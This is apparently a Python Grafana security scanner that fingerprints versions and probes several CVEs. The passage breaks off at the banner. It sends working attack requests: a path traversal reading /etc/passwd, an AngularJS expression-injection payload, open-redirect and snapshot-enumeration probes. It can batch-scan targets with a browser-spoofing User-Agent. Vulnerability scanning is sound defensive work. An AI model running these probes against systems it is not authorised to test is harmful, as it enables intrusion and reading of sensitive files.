#!/usr/bin/env python3


import argparse
import requests
import sys
import time
import json
import re
from urllib.parse import urljoin, quote, urlparse
from typing import List, Dict, Tuple, Optional
from datetime import datetime
from collections import defaultdict

# Disable SSL warnings for testing environments
requests.packages.urllib3.disable_warnings()

# Terminal color codes for professional output
class Colors:
    # Severity levels
    CRITICAL = '\033[1;91m'    # Bold Bright Red
    HIGH = '\033[1;31m'        # Bold Red
    MEDIUM = '\033[1;33m'      # Bold Yellow
    LOW = '\033[1;36m'         # Bold Cyan
    
    # Status indicators
    VULN = '\033[1;91m'        # Vulnerability found
    SAFE = '\033[1;92m'        # Safe/Passed
    INFO = '\033[1;94m'        # Information
    WARN = '\033[1;93m'        # Warning
    
    # Text formatting
    BOLD = '\033[1m'
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    
    # Special
    HEADER = '\033[1;95m'      # Magenta for headers
    SUCCESS = '\033[1;92m'     # Green for success


class GrafanaFinalScanner:
    """
    Advanced Grafana Security Scanner
    
    Performs comprehensive security assessments of Grafana instances including:
    - CVE vulnerability detection with version validation
    - Configuration security analysis
    - Information disclosure checks
    - Authentication mechanism assessment
    """
    
    def __init__(self, timeout: int = 10, verify_ssl: bool = False, verbose: bool = False):
        """
        Initialize the scanner with configuration parameters
        
        Args:
            timeout: HTTP request timeout in seconds
            verify_ssl: Whether to verify SSL certificates
            verbose: Enable detailed logging output
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        
        # Version detection cache
        self.grafana_version = None
        self.build_info = {}
        
        # Statistics
        self.stats = {
            'total_checks': 0,
            'vulnerabilities_found': 0,
            'checks_passed': 0,
            'errors': 0
        }
    
    def log(self, message: str, level: str = "INFO", indent: int = 0):
        """
        Enhanced logging with color coding and hierarchical indentation
        
        Args:
            message: The message to log
            level: Severity level (INFO, VULN, SAFE, WARN, etc.)
            indent: Indentation level for hierarchical output
        """
        timestamp = datetime.now().strftime("%H:%M:%S")
        indent_str = "  " * indent
        
        # Map level to color and symbol
        level_config = {
            'CRITICAL': (Colors.CRITICAL, '🔴', '[CRITICAL]'),
            'HIGH': (Colors.HIGH, '🟠', '[HIGH]'),
            'MEDIUM': (Colors.MEDIUM, '🟡', '[MEDIUM]'),
            'LOW': (Colors.LOW, '🔵', '[LOW]'),
            'VULN': (Colors.VULN, '⚠️', '[VULN]'),
            'SAFE': (Colors.SAFE, '✓', '[SAFE]'),
            'INFO': (Colors.INFO, 'ℹ', '[INFO]'),
            'WARN': (Colors.WARN, '⚡', '[WARN]'),
            'ERROR': (Colors.CRITICAL, '✗', '[ERROR]'),
            'SUCCESS': (Colors.SUCCESS, '✓', '[OK]'),
        }
        
        color, symbol, prefix = level_config.get(level, (Colors.RESET, '•', f'[{level}]'))
        
        if self.verbose:
            output = f"{Colors.DIM}[{timestamp}]{Colors.RESET} {indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        else:
            output = f"{indent_str}{symbol} {color}{prefix}{Colors.RESET} {message}"
        
        print(output)
    
    def detect_grafana_version(self, base_url: str) -> Optional[str]:
        """
        Multi-source version detection with fallback strategies
        
        Attempts to detect Grafana version from:
        1. /api/frontend/settings (buildInfo)
        2. /api/health endpoint
        3. Login page metadata
        4. Build artifacts
        5. Error pages
        
        Returns:
            Version string (e.g., "11.2.0") or None if detection fails
        """
        self.log("Initiating version fingerprinting...", "INFO", 1)
        
        detection_methods = [
            {
                'endpoint': '/api/frontend/settings',
                'method': 'GET',
                'parser': self._parse_frontend_settings
            },
            {
                'endpoint': '/api/health',
                'method': 'GET',
                'parser': self._parse_health_endpoint
            },
            {
                'endpoint': '/login',
                'method': 'GET',
                'parser': self._parse_login_page
            },
            {
                'endpoint': '/api/org',
                'method': 'GET',
                'parser': self._parse_api_response
            }
        ]
        
        for method_config in detection_methods:
            try:
                url = urljoin(base_url, method_config['endpoint'])
                response = self.session.request(
                    method_config['method'],
                    url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=True
                )
                
                if response.status_code == 200:
                    version = method_config['parser'](response)
                    if version:
                        self.grafana_version = version
                        self.log(f"Version detected: {Colors.BOLD}Grafana v{version}{Colors.RESET}", "SUCCESS", 1)
                        return version
                        
            except Exception as e:
                if self.verbose:
                    self.log(f"Method {method_config['endpoint']} failed: {str(e)}", "INFO", 2)
                continue
        
        self.log("Version detection unsuccessful - proceeding with comprehensive scan", "WARN", 1)
        return None
    
    def _parse_frontend_settings(self, response) -> Optional[str]:
        """Parse version from /api/frontend/settings"""
        try:
            data = response.json()
            if 'buildInfo' in data and 'version' in data['buildInfo']:
                self.build_info = data['buildInfo']
                return data['buildInfo']['version']
        except:
            pass
        return None
    
    def _parse_health_endpoint(self, response) -> Optional[str]:
        """Parse version from /api/health"""
        try:
            data = response.json()
            if 'version' in data:
                return data['version']
        except:
            pass
        return None
    
    def _parse_login_page(self, response) -> Optional[str]:
        """Parse version from login page HTML/JavaScript"""
        try:
            # Look for version in various JavaScript variables
            patterns = [
                r'"version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
                r'window\.grafanaBootData\s*=\s*{[^}]*"version"\s*:\s*"([0-9.]+)"',
                r'Grafana\s+v([0-9]+\.[0-9]+\.[0-9]+)',
                r'data-grafana-version="([0-9.]+)"'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        except:
            pass
        return None
    
    def _parse_api_response(self, response) -> Optional[str]:
        """Parse version from generic API responses"""
        try:
            # Check headers
            if 'X-Grafana-Version' in response.headers:
                return response.headers['X-Grafana-Version']
            
            # Check JSON response
            data = response.json()
            if 'version' in data:
                return data['version']
        except:
            pass
        return None
    
    def is_version_vulnerable(self, cve_id: str) -> bool:
        """
        Determine if detected version is vulnerable to specific CVE
        
        Uses version range mapping and special case handling for each CVE
        
        Args:
            cve_id: CVE identifier (e.g., "CVE-2021-43798")
            
        Returns:
            True if vulnerable or version unknown, False if patched
        """
        if not self.grafana_version:
            return True  # Unknown version = assume vulnerable for thoroughness
        
        try:
            version_parts = [int(x) for x in self.grafana_version.split('.')[:3]]
            while len(version_parts) < 3:
                version_parts.append(0)
            
            major, minor, patch = version_parts
            
            # CVE-specific version checks
            vulnerability_matrix = {
                'CVE-2025-4123': lambda: major < 12 or (major == 12 and minor == 0 and patch == 0),
                'CVE-2024-9264': lambda: (
                    (major == 11 and minor == 0 and patch <= 5) or
                    (major == 11 and minor == 1 and patch <= 6) or
                    (major == 11 and minor == 2 and patch <= 1)
                ),
                'CVE-2021-43798': lambda: major == 8 and minor <= 3,
                'CVE-2022-32275': lambda: major == 8 and minor == 4 and patch == 3,
                'CVE-2022-32276': lambda: major == 8 and minor == 4 and patch == 3,
                'CVE-2021-27358': lambda: (
                    (major == 6 and minor >= 7 and patch >= 3) or
                    (major == 7 and minor <= 4)
                ),
                'CVE-2020-11110': lambda: major < 6 or (major == 6 and minor <= 7),
                'CVE-2021-41174': lambda: major <= 8 and minor <= 3,
                'CVE-2021-39226': lambda: major <= 8 and minor <= 3,
                'CVE-2018-15727': lambda: (
                    (major <= 3) or
                    (major == 4 and (minor < 6 or (minor == 6 and patch < 4))) or
                    (major == 5 and (minor < 2 or (minor == 2 and patch < 3)))
                )
            }
            
            check_func = vulnerability_matrix.get(cve_id)
            if check_func:
                return check_func()
                
        except Exception as e:
            if self.verbose:
                self.log(f"Version check error for {cve_id}: {str(e)}", "WARN", 2)
        
        return True  # Default to vulnerable if uncertain
    
    def check_cve_2021_43798(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2021-43798: Directory Traversal - Arbitrary File Read
        
        Vulnerability: Path traversal in plugin static file serving
        Affected: Grafana 8.0.0-beta1 through 8.3.0
        Severity: CRITICAL (CVSS 7.5)
        Impact: Unauthenticated arbitrary file read
        
        Detection: Attempts to read /etc/passwd via plugin path traversal
        Validation: Requires multiple Unix password file indicators
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2021-43798'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} patched against directory traversal", base_url
        
        # Optimized plugin list - known vulnerable defaults
        test_plugins = ['alertlist', 'annolist', 'barchart', 'graph', 'table']
        traversal_path = "../" * 8 + "etc/passwd"
        
        for plugin in test_plugins:
            try:
                endpoint = f"/public/plugins/{plugin}/{traversal_path}"
                test_url = urljoin(base_url, endpoint)
                
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                
                if response.status_code == 200:
                    content = response.text.lower()
                    
                    # Strict validation - must contain multiple Unix passwd indicators
                    indicators_found = 0
                    required_indicators = [
                        ('root:', 'Root user entry'),
                        ('/bin/', 'Shell path'),
                        (':x:', 'Password placeholder'),
                        ('daemon:', 'System daemon user')
                    ]
                    
                    for indicator, description in required_indicators:
                        if indicator in content:
                            indicators_found += 1
                    
                    # Require at least 3 indicators to confirm
                    if indicators_found >= 3:
                        self.stats['vulnerabilities_found'] += 1
                        return True, f"Directory traversal CONFIRMED - /etc/passwd readable via '{plugin}' plugin ({indicators_found}/4 indicators)", test_url
                        
            except requests.exceptions.Timeout:
                continue
            except Exception as e:
                if self.verbose:
                    self.log(f"Plugin {plugin} test error: {str(e)}", "INFO", 3)
                continue
        
        self.stats['checks_passed'] += 1
        return False, "Directory traversal blocked - file read protection active", base_url
    
    def check_cve_2025_4123(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2025-4123: "Grafana Ghost" - Path Traversal & Open Redirect XSS
        
        Vulnerability: Multiple issues in /public and /redirect endpoints
        Affected: All versions before security patches
        Severity: CRITICAL (CVSS 8.2)
        Impact: XSS, account takeover, SSRF
        
        Detection: Tests for unvalidated redirects and path traversal
        Validation: Confirms actual external domain redirection
        """
        self.stats['total_checks'] += 1
        
        test_vectors = [
            {
                'path': '/redirect',
                'params': {'url': 'http://external-test-domain.example.com'},
                'type': 'open_redirect'
            },
            {
                'path': '/public/plugins/test/../../../',
                'params': {},
                'type': 'path_traversal'
            }
        ]
        
        vulnerabilities = []
        
        for vector in test_vectors:
            try:
                if vector['params']:
                    test_url = urljoin(base_url, vector['path']) + '?' + '&'.join([f"{k}={v}" for k, v in vector['params'].items()])
                else:
                    test_url = urljoin(base_url, vector['path'])
                
                response = self.session.get(
                    test_url,
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                    allow_redirects=False
                )
                
                if vector['type'] == 'open_redirect':
                    if response.status_code in [301, 302, 303, 307, 308]:
                        location = response.headers.get('Location', '')
                        if location:
                            # Validate external redirect
                            try:
                                parsed_base = urlparse(base_url)
                                parsed_location = urlparse(location)
                                
                                if parsed_location.netloc and parsed_base.netloc != parsed_location.netloc:
                                    vulnerabilities.append(f"Open redirect to external domain: {parsed_location.netloc}")
                            except:
                                pass
                                
            except Exception as e:
                if self.verbose:
                    self.log(f"CVE-2025-4123 test error: {str(e)}", "INFO", 3)
                continue
        
        if vulnerabilities:
            self.stats['vulnerabilities_found'] += 1
            return True, " | ".join(vulnerabilities), test_url
        
        self.stats['checks_passed'] += 1
        return False, "Redirect validation and path sanitization active", base_url
    
    def check_cve_2024_9264(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2024-9264: DuckDB SQL Injection
        
        Vulnerability: SQL injection in experimental SQL Expressions feature
        Affected: Grafana 11.0.0-11.0.5, 11.1.0-11.1.6, 11.2.0-11.2.1
        Severity: CRITICAL (CVSS 9.0+)
        Impact: RCE, arbitrary file read (requires DuckDB binary)
        
        Detection: Tests for SQL Expressions endpoint availability
        Note: Requires authentication - reports as info only
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2024-9264'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} not affected by SQL injection", base_url
        
        endpoint = "/api/ds/query?ds_type=__expr__&requestId=security_scan"
        test_url = urljoin(base_url, endpoint)
        
        try:
            # Probe for endpoint existence
            test_payload = {
                "queries": [{
                    "refId": "A",
                    "datasource": {"type": "__expr__", "uid": "__expr__"},
                    "type": "sql",
                    "expression": "SELECT 1"
                }],
                "from": "now-1h",
                "to": "now"
            }
            
            response = self.session.post(
                test_url,
                json=test_payload,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            if response.status_code in [401, 403]:
                self.stats['checks_passed'] += 1
                return False, "SQL Expressions require authentication - remote testing not possible", test_url
            elif response.status_code == 200:
                # Endpoint exists but need DuckDB binary to exploit
                self.stats['checks_passed'] += 1
                return False, "SQL Expressions available (exploitability requires DuckDB binary installation)", test_url
                
        except Exception as e:
            if self.verbose:
                self.log(f"SQL injection test error: {str(e)}", "INFO", 3)
        
        self.stats['checks_passed'] += 1
        return False, "SQL Expressions endpoint not available or removed", test_url
    
    def check_cve_2018_15727(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2018-15727: Authentication Bypass via Cookie Forging
        
        Vulnerability: Predictable "remember me" cookie generation
        Affected: Grafana 2.x-3.x, 4.x < 4.6.4, 5.x < 5.2.3
        Severity: HIGH (CVSS 8.1)
        Impact: Account takeover for LDAP/OAuth users
        
        Detection: Identifies LDAP/OAuth authentication mechanisms
        Validation: Checks for actual auth configuration, not keywords
        """
        self.stats['total_checks'] += 1
        
        if not self.is_version_vulnerable('CVE-2018-15727'):
            self.stats['checks_passed'] += 1
            return False, f"Version {self.grafana_version} has secure cookie generation", base_url
        
        test_url = urljoin(base_url, "/login")
        
        try:
            response = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
            
            if response.status_code == 200:
                content = response.text.lower()
                
                # Look for actual auth configuration, not just keywords
                auth_indicators = {
                    'ldap': ['ldap_enabled', 'ldap auth', 'ldap login', 'ldap_server'],
                    'oauth': ['oauth_client', 'oauth2', 'google_client_id', 'github_client_id', 'azure_auth']
                }
                
                detected_auth = []
                
                for auth_type, indicators in auth_indicators.items():
                    for indicator in indicators:
                        if indicator in content:
                            detected_auth.append(auth_type.upper())
                            break
                
                if detected_auth:
                    self.stats['vulnerabilities_found'] += 1
                    auth_methods = ' & '.join(set(detected_auth))
                    return True, f"{auth_methods} authentication enabled - vulnerable to cookie forging attack", test_url
                    
        except Exception as e:
            if self.verbose:
                self.log(f"Auth bypass test error: {str(e)}", "INFO", 3)
        
        self.stats['checks_passed'] += 1
        return False, "No LDAP/OAuth configuration detected", test_url
    
    def check_cve_2021_39226(self, base_url: str) -> Tuple[bool, str, str]:
        """
        CVE-2021-39226: Snapshot Enumeration
        
        Vulnerability: Predictable snapshot IDs allow enumeration
        Affected: Multiple versions
        Severity: MEDIUM (CVSS 6.5)
        Impact: Unauthorized access to dashboard snapshots
        
        Detection: Tests multiple snapshot IDs for accessibility
        Validation: Requires valid JSON snapshot data in response
        """
        self.stats['total_checks'] += 1
        
        # Test multiple IDs to reduce false positives
        test_ids = [1, 2, 5, 10, 100]
        accessible_snapshots = 0
        last_test_url = base_url
        
        for snapshot_id in test_ids:
            endpoints = [
                f"/api/snapshots/{snapshot_id}",
                f"/dashboard/snapshot/{snapshot_id}"
            ]
            
            for endpoint in endpoints:
                try:
                    test_url = urljoin(base_url, endpoint)
                    last_test_url = test_url
                    
                    response = self.session.get(
                        test_url,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    if response.status_code == 200:
                        # Validate it's actually a snapshot, not error page
                        try:
                            data = response.json()
                            if isinstance(data, dict) and ('dashboard' in data or 'meta' in data):
                                accessible_snapshots += 1
                                break
                        except:
                            # HTML response - check for snapshot indicators
                            if 'snapshot' in response.text.lower() and 'dashboard' in response.text.lower():
                                accessible_snapshots += 1
                                break
                                
                except Exception:
                    continue
        
        if accessible_snapshots > 0:
            self.stats['vulnerabilities_found'] += 1
            return True, f"Snapshot enumeration confirmed - {accessible_snapshots}/{len(test_ids)} test IDs accessible", last_test_url
        
        self.stats['checks_passed'] += 1
        return False, "Snapshots protected or enumeration blocked", base_url
    
    def check_additional_cves(self, base_url: str) -> List[Tuple[bool, str, str, str]]:
        """
        Check remaining CVEs with simplified detection logic
        
        Returns list of tuples: (vulnerable, message, test_url, cve_id)
        """
        results = []
        
        # CVE-2020-11110: Stored XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2020-11110'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl)
                if r.status_code == 200:
                    results.append((True, "Snapshots API accessible - XSS vector available", test_url, "CVE-2020-11110"))
                    self.stats['vulnerabilities_found'] += 1
                else:
                    results.append((False, "Snapshots API protected", test_url, "CVE-2020-11110"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2020-11110"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2020-11110"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-41174: AngularJS XSS
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-41174'):
            payload = quote("{{constructor.constructor('return 1337')()")
            test_url = urljoin(base_url, f"/dashboard/snapshot/{payload}?orgId=1")
            try:
                r = self.session.get(test_url, timeout=self.timeout, verify=self.verify_ssl, allow_redirects=False)
                if r.status_code == 200 and "constructor" in r.text:
                    results.append((True, "AngularJS expression injection possible", test_url, "CVE-2021-41174"))
                    self.stats['vulnerabilities_found'] += 1
                else:
                    results.append((False, "AngularJS sanitization active", test_url, "CVE-2021-41174"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-41174"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-41174"))
            self.stats['checks_passed'] += 1
        
        # CVE-2021-27358: DoS via Snapshots
        self.stats['total_checks'] += 1
        if self.is_version_vulnerable('CVE-2021-27358'):
            test_url = urljoin(base_url, "/api/snapshots")
            try:
                r = self.session.post(test_url, json={"name": "test"}, timeout=self.timeout, verify=self.verify_ssl)
                if r.status_code not in [401, 403, 404, 405]:
                    results.append((True, "Unauthenticated POST to snapshots - DoS vector", test_url, "CVE-2021-27358"))
                    self.stats['vulnerabilities_found'] += 1
                else:
                    results.append((False, "Snapshots POST restricted", test_url, "CVE-2021-27358"))
                    self.stats['checks_passed'] += 1
            except:
                results.append((False, "Connection error", test_url, "CVE-2021-27358"))
                self.stats['errors'] += 1
        else:
            results.append((False, f"Version {self.grafana_version} not vulnerable", base_url, "CVE-2021-27358"))
            self.stats['checks_passed'] += 1
        
        # CVE-2022-32275 & CVE-2022-32276
        for cve_id in ['CVE-2022-32275', 'CVE-2022-32276']:
            self.stats['total_checks'] += 1
            if self.is_version_vulnerable(cve_id):
                results.append((False, "Specific to v8.4.3 - requires manual validation", base_url, cve_id))
                self.stats['checks_passed'] += 1
            else:
                results.append((False, f"Version {self.grafana_version} not affected", base_url, cve_id))
                self.stats['checks_passed'] += 1
        
        return results
    
    def check_security_config(self, base_url: str) -> Dict:
        """
        Analyze security configuration and information disclosure
        
        Checks:
        - Anonymous access status
        - Metrics endpoint exposure
        - Plugin installation permissions
        - Build information disclosure
        """
        config_results = {}
        
        # Anonymous Access
        try:
            url = urljoin(base_url, "/api/frontend/settings")
            r = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            if r.status_code == 200:
                try:
                    data = r.json()
                    anon_enabled = data.get('anonymousEnabled', False)
                    config_results['anonymous_access'] = {
                        'enabled': anon_enabled,
                        'severity': 'MEDIUM' if anon_enabled else 'INFO',
                        'message': 'Anonymous access ENABLED - unauthenticated viewing possible' if anon_enabled else 'Anonymous access disabled',
                        'url': url
                    }
                except:
                    config_results['anonymous_access'] = {'enabled': None, 'severity': 'INFO', 'message': 'Could not parse settings', 'url': url}
        except:
            pass
        
        # Metrics Exposure
        try:
            url = urljoin(base_url, "/metrics")
            r = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            if r.status_code == 200 and ("# TYPE" in r.text or "# HELP" in r.text):
                config_results['metrics'] = {
                    'exposed': True,
                    'severity': 'LOW',
                    'message': 'Prometheus metrics endpoint exposed - system information disclosure',
                    'url': url
                }
            else:
                config_results['metrics'] = {
                    'exposed': False,
                    'severity': 'INFO',
                    'message': 'Metrics endpoint not exposed',
                    'url': base_url
                }
        except:
            pass
        
        # Plugin Information
        try:
            url = urljoin(base_url, "/api/plugins")
            r = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl)
            if r.status_code == 200:
                try:
                    plugins = r.json()
                    if isinstance(plugins, list):
                        unsigned = [p for p in plugins if 'unsigned' in str(p.get('signature', '')).lower()]
                        config_results['plugins'] = {
                            'count': len(plugins),
                            'unsigned_count': len(unsigned),
                            'severity': 'MEDIUM' if unsigned else 'INFO',
                            'message': f"{len(plugins)} plugins installed ({len(unsigned)} unsigned)" if unsigned else f"{len(plugins)} plugins installed",
                            'url': url
                        }
                except:
                    pass
        except:
            pass
        
        return config_results
    
    def scan_target(self, url: str) -> Dict:
        """
        Perform comprehensive security assessment of target
        
        Execution flow:
        1. Connectivity verification
        2. Version fingerprinting
        3. CVE vulnerability testing
        4. Configuration security analysis
        5. Results compilation and reporting
        
        Returns:
            Dictionary containing scan results, vulnerabilities, and metadata
        """
        # Reset statistics for this target
        self.stats = {'total_checks': 0, 'vulnerabilities_found': 0, 'checks_passed': 0, 'errors': 0}
        
        # Header
        print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
        print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}TARGET ASSESSMENT{Colors.RESET}")
        print(f"{Colors.HEADER}║{Colors.RESET} {Colors.UNDERLINE}{url}{Colors.RESET}")
        print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
        
        # Normalize URL
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'version': None,
            'build_info': {},
            'vulnerabilities': [],
            'configuration': {},
            'statistics': {},
            'accessible': False
        }
        
        # Phase 1: Connectivity
        self.log("Phase 1: Connectivity Verification", "INFO")
        try:
            response = self.session.get(url, timeout=self.timeout, verify=self.verify_ssl, allow_redirects=True)
            results['accessible'] = True
            self.log(f"Target reachable (HTTP {response.status_code})", "SUCCESS", 1)
        except requests.exceptions.SSLError:
            self.log("SSL certificate validation failed - use --no-ssl-verify for self-signed certificates", "ERROR", 1)
            return results
        except requests.exceptions.Timeout:
            self.log(f"Connection timeout ({self.timeout}s) - target may be slow or blocking requests", "ERROR", 1)
            return results
        except requests.exceptions.ConnectionError as e:
            self.log(f"Connection refused: {str(e)}", "ERROR", 1)
            return results
        except Exception as e:
            self.log(f"Unexpected error: {str(e)}", "ERROR", 1)
            return results
        
        # Phase 2: Version Detection
        print()
        self.log("Phase 2: Version Fingerprinting", "INFO")
        version = self.detect_grafana_version(url)
        results['version'] = version
        results['build_info'] = self.build_info
        
        # Phase 3: Vulnerability Assessment
        print()
        self.log("Phase 3: Vulnerability Scanning", "INFO")
        print()
        
        # Critical CVEs
        cve_checks = [
            ("CVE-2025-4123", "CRITICAL", "Path Traversal & Open Redirect", self.check_cve_2025_4123),
            ("CVE-2024-9264", "CRITICAL", "DuckDB SQL Injection (RCE)", self.check_cve_2024_9264),
            ("CVE-2021-43798", "CRITICAL", "Directory Traversal", self.check_cve_2021_43798),
            ("CVE-2018-15727", "HIGH", "Authentication Bypass", self.check_cve_2018_15727),
            ("CVE-2021-39226", "MEDIUM", "Snapshot Enumeration", self.check_cve_2021_39226),
        ]
        
        for cve_id, severity, description, check_func in cve_checks:
            vulnerable, message, test_url = check_func(url)
            
            if vulnerable:
                self.log(f"{cve_id:18} {description}", severity, 1)
                self.log(f"└─ {message}", severity, 2)
                self.log(f"└─ Test URL: {Colors.DIM}{test_url}{Colors.RESET}", severity, 2)
                print()
                
                results['vulnerabilities'].append({
                    'cve_id': cve_id,
                    'severity': severity,
                    'description': description,
                    'message': message,
                    'test_url': test_url
                })
            elif self.verbose:
                self.log(f"{cve_id:18} {message}", "SAFE", 1)
        
        # Additional CVEs
        for vulnerable, message, test_url, cve_id in self.check_additional_cves(url):
            if vulnerable:
                severity = "MEDIUM" if "2020" in cve_id or "2021" in cve_id else "LOW"
                self.log(f"{cve_id:18} {message}", severity, 1)
                self.log(f"└─ Test URL: {Colors.DIM}{test_url}{Colors.RESET}", severity, 2)
                print()
                
                results['vulnerabilities'].append({
                    'cve_id': cve_id,
                    'severity': severity,
                    'message': message,
                    'test_url': test_url
                })
            elif self.verbose:
                self.log(f"{cve_id:18} {message}", "SAFE", 1)
        
        # Phase 4: Configuration Analysis
        print()
        self.log("Phase 4: Security Configuration Analysis", "INFO")
        config = self.check_security_config(url)
        results['configuration'] = config
        
        for check_name, check_data in config.items():
            if check_data.get('severity') in ['LOW', 'MEDIUM', 'HIGH']:
                self.log(check_data['message'], check_data['severity'], 1)
                self.log(f"└─ Endpoint: {Colors.DIM}{check_data.get('url', 'N/A')}{Colors.RESET}", check_data['severity'], 2)
        
        # Final Statistics
        results['statistics'] = self.stats
        
        return results
    
    def scan_from_file(self, filename: str) -> List[Dict]:
        """
        Scan multiple targets from file
        
        File format: One URL per line, # for comments
        """
        try:
            with open(filename, 'r') as f:
                urls = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            
            self.log(f"Loaded {len(urls)} targets from {filename}", "INFO")
            
            results = []
            for i, url in enumerate(urls, 1):
                print(f"\n{Colors.BOLD}[Target {i}/{len(urls)}]{Colors.RESET}")
                result = self.scan_target(url)
                results.append(result)
                
                if i < len(urls):
                    time.sleep(1)  # Polite delay between targets
            
            return results
            
        except FileNotFoundError:
            self.log(f"File not found: {filename}", "ERROR")
            sys.exit(1)
        except Exception as e:
            self.log(f"Error reading file: {str(e)}", "ERROR")
            sys.exit(1)
    
    def generate_report(self, results: List[Dict], output_file: Optional[str] = None):
        """
        Generate comprehensive assessment report
        """
        print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
        print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}ASSESSMENT SUMMARY{Colors.RESET}")
        print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
        
        # Statistics
        total_targets = len(results)
        vulnerable_targets = sum(1 for r in results if r['vulnerabilities'])
        
        severity_counts = defaultdict(int)
        for result in results:
            for vuln in result['vulnerabilities']:
                severity_counts[vuln['severity']] += 1
        
        # Summary
        print(f"Targets Scanned:      {Colors.BOLD}{total_targets}{Colors.RESET}")
        print(f"Vulnerable Targets:   {Colors.CRITICAL if vulnerable_targets > 0 else Colors.SUCCESS}{Colors.BOLD}{vulnerable_targets}{Colors.RESET}")
        print(f"Secure Targets:       {Colors.SUCCESS}{Colors.BOLD}{total_targets - vulnerable_targets}{Colors.RESET}")
        
        print(f"\n{Colors.BOLD}Vulnerability Distribution:{Colors.RESET}")
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts.get(severity, 0)
            if count > 0:
                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                print(f"  {symbol} {color}{severity:10} {count:3}{Colors.RESET}")
            else:
                print(f"  ✓ {Colors.DIM}{severity:10}   0{Colors.RESET}")
        
        # Detailed Findings
        if vulnerable_targets > 0:
            print(f"\n{Colors.HEADER}{'═'*80}{Colors.RESET}")
            print(f"{Colors.HEADER}║{Colors.RESET} {Colors.BOLD}DETAILED FINDINGS{Colors.RESET}")
            print(f"{Colors.HEADER}{'═'*80}{Colors.RESET}\n")
            
            for result in results:
                if result['vulnerabilities']:
                    print(f"{Colors.VULN}▶{Colors.RESET} {Colors.BOLD}{result['url']}{Colors.RESET}")
                    if result['version']:
                        print(f"  {Colors.DIM}Version: Grafana v{result['version']}{Colors.RESET}")
                    
                    # Group by severity
                    for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
                        vulns = [v for v in result['vulnerabilities'] if v['severity'] == severity]
                        
                        if vulns:
                            for vuln in vulns:
                                color = {'CRITICAL': Colors.CRITICAL, 'HIGH': Colors.HIGH, 'MEDIUM': Colors.MEDIUM, 'LOW': Colors.LOW}[severity]
                                symbol = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🔵'}[severity]
                                
                                print(f"\n  {symbol} {color}[{severity}] {vuln['cve_id']}{Colors.RESET}")
                                print(f"     └─ {vuln['message']}")
                                print(f"     └─ {Colors.DIM}{vuln['test_url']}{Colors.RESET}")
                    
                    print()
        else:
            print(f"\n{Colors.SUCCESS}✓ All scanned targets appear secure{Colors.RESET}")
        
        # Save JSON report
        if output_file:
            try:
                with open(output_file, 'w') as f:
                    json.dump(results, f, indent=2, default=str)
                print(f"\n{Colors.SUCCESS}[+] Detailed report saved: {output_file}{Colors.RESET}")
            except Exception as e:
                print(f"\n{Colors.CRITICAL}[-] Error saving report: {str(e)}{Colors.RESET}")


def print_banner():
    """Display professional tool banner"""
    banner = f"""
{Colors.CRITICAL}╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                         ║
